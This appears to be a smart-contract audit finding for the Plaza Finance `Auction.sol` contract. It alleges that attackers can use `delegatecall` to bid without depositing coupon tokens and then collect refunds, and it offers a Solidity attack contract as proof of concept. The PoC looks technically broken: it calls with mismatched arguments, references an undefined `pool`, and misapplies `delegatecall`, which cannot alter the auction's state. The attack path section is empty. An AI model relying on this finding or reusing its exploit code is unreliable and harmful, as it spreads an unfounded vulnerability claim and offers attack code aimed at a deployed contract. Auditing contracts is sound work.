# Malicious bidder just increase `currentCouponAmount` value with no coupon tokens deposit

### Summary

Attackers can exploit the `delegatecall` function in `Auction.sol`, allowing them to participate in the auction without making a deposit.

### Root Cause

If the attacker uses `delegatecall` to invoke the following function, coupon tokens are transferred to the attacker's contract. However, there is no verification between the balance of the auction and the `sellAmount`.

Refer to the [function bid()](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/Auction.sol#L125C3-L171C4):

```solidity
131    // Transfer buy tokens to contract
132    IERC20(buyCouponToken).safeTransferFrom(msg.sender, address(this), sellCouponAmount);
```

Additionally, the attacker receives a bonus coupon amount if their bid is removed from the linked list. This behavior is defined in the following functions:
- [function removeExcessBids()](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/Auction.sol#L285C1-L286C80)
- [function _removeBid(uint256 bidIndex)](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/Auction.sol#L324C1-L325C67)

```solidity
285        // Refund the proportional sellAmount
286        IERC20(buyCouponToken).safeTransfer(currentBid.bidder, amountToRemove);
```

```solidity
324    // Refund the buy tokens for the removed bid
325    IERC20(buyCouponToken).safeTransfer(bidder, sellCouponAmount);
```

### Internal Pre-conditions

_No response_

### External Pre-conditions

_No response_

### Attack Path

_No response_

### Impact

This vulnerability can lead to a loss of coupon tokens in the auction and potentially result in a Denial of Service (DoS).

### Proof of Concept (PoC)

The attacker can utilize the following contract:

```solidity
contract Attack is Auction {
  address public owner;
  Auction public auction;

  constructor(Auction _auction) {
    owner = msg.sender;
    auction = Auction(_auction);
  }

  function fakeBid (
    uint256 buyReserveAmount,
    uint256 sellCouponAmount
  ) external returns(uint256) {
    (bool success, bytes memory data) = address(pool).delegatecall(abi.encodeWithSignature("create(uint256)", buyReserveAmount, sellCouponAmount));
  }
}
```

### Mitigation

To mitigate this issue, ensure that tokens are transferred to an indexed address or verify that the change in the auction's coupon token balance is below the `sellCouponAmount`.
